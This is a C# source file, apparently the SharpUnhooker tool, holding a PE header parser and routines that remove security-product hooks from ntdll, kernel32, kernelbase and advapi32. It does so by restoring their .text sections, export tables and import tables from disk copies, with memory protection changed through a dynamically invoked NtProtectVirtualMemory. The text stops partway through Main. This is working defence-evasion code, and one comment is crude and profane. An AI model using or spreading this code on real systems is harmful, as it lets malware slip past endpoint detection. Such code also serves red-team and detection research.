using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public UInt16 e_magic;              // Magic number
        public UInt16 e_cblp;               // Bytes on last page of file
        public UInt16 e_cp;                 // Pages in file
        public UInt16 e_crlc;               // Relocations
        public UInt16 e_cparhdr;            // Size of header in paragraphs
        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
        public UInt16 e_ss;                 // Initial (relative) SS value
        public UInt16 e_sp;                 // Initial SP value
        public UInt16 e_csum;               // Checksum
        public UInt16 e_ip;                 // Initial IP value
        public UInt16 e_cs;                 // Initial (relative) CS value
        public UInt16 e_lfarlc;             // File address of relocation table
        public UInt16 e_ovno;               // Overlay number
        public UInt16 e_res_0;              // Reserved words
        public UInt16 e_res_1;              // Reserved words
        public UInt16 e_res_2;              // Reserved words
        public UInt16 e_res_3;              // Reserved words
        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
        public UInt16 e_res2_0;             // Reserved words
        public UInt16 e_res2_1;             // Reserved words
        public UInt16 e_res2_2;             // Reserved words
        public UInt16 e_res2_3;             // Reserved words
        public UInt16 e_res2_4;             // Reserved words
        public UInt16 e_res2_5;             // Reserved words
        public UInt16 e_res2_6;             // Reserved words
        public UInt16 e_res2_7;             // Reserved words
        public UInt16 e_res2_8;             // Reserved words
        public UInt16 e_res2_9;             // Reserved words
        public UInt32 e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {

        Stub = 0x00000000,

    }


    /// The DOS header

    private IMAGE_DOS_HEADER dosHeader;

    /// The file header

    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 

    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 

    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.

    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;



    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = System.IO.File.ReadAllBytes(filePath);

        }
    }

    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;

        }
    }


    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }



    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }


    public IMAGE_FILE_HEADER FileHeader
    {
        get
        {
            return fileHeader;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get
        {
            return optionalHeader32;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get
        {
            return optionalHeader64;
        }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get
        {
            return imageSectionHeaders;
        }
    }

    public byte[] RawBytes
    {
        get
        {
            return rawbytes;
        }

    }

}

public class Dynavoke {
    // Delegate NtProtectVirtualMemory
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtProtectVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        // will return IntPtr.Zero if not found!
        return FunctionPtr;
    }

    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
        // Craft an array for the arguments
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        // get NtProtectVirtualMemory's pointer
        IntPtr NTDLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
        // dynamicly invoke NtProtectVirtualMemory
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NtProtectVirtualMemoryDelegate));
        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);

        if (NTSTATUSResult != 0x00000000) {
            return false;
        }
        OldProtect = (UInt32)funcargs[4];
        return true;
    }
}



public class SharpUnhooker {

    public static string[] BlacklistedFunction = {"EnterCriticalSection","LeaveCriticalSection","DeleteCriticalSection","InitializeSListHead","HeapAlloc","HeapReAlloc","HeapSize"};

    public static bool IsBlacklistedFunction(string FuncName) {
        for (int i = 0; i < BlacklistedFunction.Length; i++) {
            if (String.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase)) {
                return true;
            }
        }
        return false;
    }

    public static void Copy(ref byte[] source, int sourceStartIndex, ref byte[] destination, int destinationStartIndex, int length) {
        if (source == null || source.Length == 0 || destination == null || destination.Length == 0 || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if (length > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : length exceeds the size of source bytes!");
        }
        if ((sourceStartIndex + length) > source.Length) {
            throw new ArgumentOutOfRangeException("Exception : sourceStartIndex and length exceeds the size of source bytes!");
        }
        if ((destinationStartIndex + length) > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : destinationStartIndex and length exceeds the size of destination bytes!");
        }
        int targetIndex = destinationStartIndex;
        for (int sourceIndex = sourceStartIndex; sourceIndex < (sourceStartIndex + length); sourceIndex++) {
            destination[targetIndex] = source[sourceIndex];
            targetIndex++;
        }
    }

    public static bool JMPUnhooker(string DLLname) {
        // get the file path of the module
        string ModuleFullPath = String.Empty;
        try { ModuleFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ ModuleFullPath = null; }
        if (ModuleFullPath == null) {
            Console.WriteLine("[*] Module is not loaded,Skipping...");
            return true;
        }

        // read and parse the module, and then get the .TEXT section header
        byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
        PEReader OriginalModule = new PEReader(ModuleBytes);
        int TextSectionNumber = 0;
        for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++) {
            if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase)) {
                TextSectionNumber = i;
                break;
            }
        }

        // copy the original .TEXT section
        IntPtr TextSectionSize = new IntPtr(OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);
        byte[] OriginalTextSectionBytes = new byte[(int)TextSectionSize];
        Copy(ref ModuleBytes, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].PointerToRawData, ref OriginalTextSectionBytes, 0, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);

        // get the module base address and the .TEXT section address
        IntPtr ModuleBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;

        // change memory protection to RWX
        UInt32 oldProtect = 0;
        bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
        if (!updateMemoryProtection) {
            Console.WriteLine("[-] Failed to change memory protection to RWX!");
            return false;
        }
        // apply the patch (the original .TEXT section)
        bool PatchApplied = true;
        try{ Marshal.Copy(OriginalTextSectionBytes, 0, ModuleTextSectionAddress, OriginalTextSectionBytes.Length); }catch{ PatchApplied = false; }
        if (!PatchApplied) {
            Console.WriteLine("[-] Failed to replace the .text section of the module!");
            return false;
        }
        // revert the memory protection
        UInt32 newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
        // done!
        Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
        return true;
    }

    public static void EATUnhooker(string ModuleName) {
        IntPtr ModuleBase = IntPtr.Zero;
        try { ModuleBase = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch {}
        if (ModuleBase == IntPtr.Zero) {
            Console.WriteLine("[-] Module is not loaded,Skipping...");
            return;
        }
        string ModuleFileName = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
        byte[] ModuleRawByte = System.IO.File.ReadAllBytes(ModuleFileName);

        // Traverse the PE header in memory
        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        Int64 pExport = 0;
        if (Magic == 0x010b) {
            pExport = OptHeader + 0x60;
        }
        else {
            pExport = OptHeader + 0x70;
        }

        // prepare module clone
        PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
        int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
        int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
        IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
        Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
        for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++) {
            IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
            Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
        }

        // Read -> IMAGE_EXPORT_DIRECTORY
        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        if (ExportRVA == 0) {
            Console.WriteLine("[-] Module doesnt have any exports, skipping...");
            return;
        }
        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
        Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));

        // eat my cock u fokin user32.dll
        IntPtr TargetPtr = ModuleBase + FunctionsRVA;
        IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x04, ref oldProtect)) {
            Console.WriteLine("[-] Failed to change EAT's memory protection to RW!");
            return;
        }

        // Loop the array of export RVA's
        for (int i = 0; i < NumberOfFunctions; i++) {
            string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
            Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
            if (FunctionRVA != FunctionRVAOriginal) {
                try { Marshal.WriteInt32(((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))), FunctionRVAOriginal); }catch {
                    Console.WriteLine("[-] Failed to rewrite the EAT of {0} with RVA of {1} and function ordinal of {2}", FunctionName, FunctionRVA.ToString("X4"), FunctionOrdinal);
                    continue;
                }
            }
        }

        Marshal.FreeHGlobal(OriginalModuleBase);
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, oldProtect, ref newProtect);
        Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED!", ModuleName.ToUpper());
    }

    public static void IATUnhooker(string ModuleName) {
        IntPtr PEBaseAddress = IntPtr.Zero;
        try { PEBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch {}
        if (PEBaseAddress == IntPtr.Zero) {
            Console.WriteLine("[-] Module is not loaded, Skipping...");
            return;
        }

        // parse the initial header of the PE
        IntPtr OptHeader = PEBaseAddress + Marshal.ReadInt32((IntPtr)(PEBaseAddress + 0x3C)) + 0x18;
        IntPtr SizeOfHeaders = (IntPtr)Marshal.ReadInt32(OptHeader + 60);
        Int16 Magic = Marshal.ReadInt16(OptHeader + 0);
        IntPtr DataDirectoryAddr = IntPtr.Zero;        
        if (Magic == 0x010b) {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x60); // PE32, 0x60 = 96 
        }
        else {
            DataDirectoryAddr = (IntPtr)(OptHeader.ToInt64() + (long)0x70); // PE32+, 0x70 = 112
        }

        // get the base address of all of the IAT array, and get the whole size of the IAT array
        IntPtr IATBaseAddress = (IntPtr)((long)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(DataDirectoryAddr + 96)));
        IntPtr IATSize = (IntPtr)Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)96 + (long)4));

        // check if current PE have any import(s)
        if ((int)IATSize == 0) {
            Console.WriteLine("[-] Module doesnt have any imports, Skipping...");
            return;
        }

        // change memory protection of the IAT to RW
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, 0x04, ref oldProtect)) {
            Console.WriteLine("[-] Failed to change IAT's memory protection to RW!");
            return;
        }

        // get import table address
        int ImportTableSize = Marshal.ReadInt32((IntPtr)(DataDirectoryAddr.ToInt64() + (long)12)); //  IMPORT TABLE Size = byte 8 + 4 (4 is the size of the RVA) from the start of the data directory
        IntPtr ImportTableAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)DataDirectoryAddr + 8)); // IMPORT TABLE RVA = byte 8 from the start of the data directory
        int ImportTableCount = (ImportTableSize / 20);

        // iterates through the import tables
        for (int i = 0; i < (ImportTableCount - 1); i++) {
            IntPtr CurrentImportTableAddr = (IntPtr)(ImportTableAddr.ToInt64() + (long)(20 * i));

            string CurrentImportTableName = Marshal.PtrToStringAnsi((IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr + 12))).Trim(); // Name RVA = byte 12 from start of the current import table
            if (CurrentImportTableName.StartsWith("api-ms-win")) { 
                continue;
            }

            // get IAT (FirstThunk) and ILT (OriginalFirstThunk) address from Import Table
            IntPtr CurrentImportIATAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32((IntPtr)(CurrentImportTableAddr.ToInt64() + (long)16))); // IAT RVA = byte 16 from the start of the current import table
            IntPtr CurrentImportILTAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadInt32(CurrentImportTableAddr)); // ILT RVA = byte 0 from the start of the current import table

            // get the imported module base address
            IntPtr ImportedModuleAddr = IntPtr.Zero;
            try{ ImportedModuleAddr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => CurrentImportTableName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{}
            if (ImportedModuleAddr == IntPtr.Zero) { // check if its loaded or not
                continue;
            }

            // loop through the functions
            for (int z = 0; z < 999999; z++) {
                IntPtr CurrentFunctionILTAddr = (IntPtr)(CurrentImportILTAddr.ToInt64() + (long)(IntPtr.Size * z));
                IntPtr CurrentFunctionIATAddr = (IntPtr)(CurrentImportIATAddr.ToInt64()  + (long)(IntPtr.Size * z));

                // check if current ILT is empty
                if (Marshal.ReadIntPtr(CurrentFunctionILTAddr) == IntPtr.Zero) { // the ILT is null, which means we're already on the end of the table
                    break;
                }

                IntPtr CurrentFunctionNameAddr = (IntPtr)(PEBaseAddress.ToInt64() + (long)Marshal.ReadIntPtr(CurrentFunctionILTAddr)); // reading a union structure for getting the name RVA
                string CurrentFunctionName = Marshal.PtrToStringAnsi(CurrentFunctionNameAddr + 2).Trim(); // reading the Name field on the Name table
                
                if (String.IsNullOrEmpty(CurrentFunctionName)) { 
                    continue; // used to silence ntdll's RtlDispatchApc ordinal imported by kernelbase
                }
                if (IsBlacklistedFunction(CurrentFunctionName)) {
                    continue;
                }

                // get current function real address
                IntPtr CurrentFunctionRealAddr = Dynavoke.GetExportAddress(ImportedModuleAddr, CurrentFunctionName);
                if (CurrentFunctionRealAddr == IntPtr.Zero) {
                    Console.WriteLine("[-] Failed to find function export address of {0} from {1}! CurrentFunctionNameAddr = {2}", CurrentFunctionName, CurrentImportTableName, CurrentFunctionNameAddr.ToString("X4"));
                    continue;
                }

                // compare the address
                if (Marshal.ReadIntPtr(CurrentFunctionIATAddr) != CurrentFunctionRealAddr) {
                    try { Marshal.WriteIntPtr(CurrentFunctionIATAddr, CurrentFunctionRealAddr); }catch (Exception e){
                        Console.WriteLine("[-] Failed to rewrite IAT of {0}! Reason : {1}", CurrentFunctionName, e.Message);
                    }
                }
            }
        }

        // revert IAT's memory protection
        uint newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref IATBaseAddress, ref IATSize, oldProtect, ref newProtect);
        Console.WriteLine("[+++] {0} IMPORTS ARE CLEANSED!", ModuleName.ToUpper());
    }

    public static void Main() {

        string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
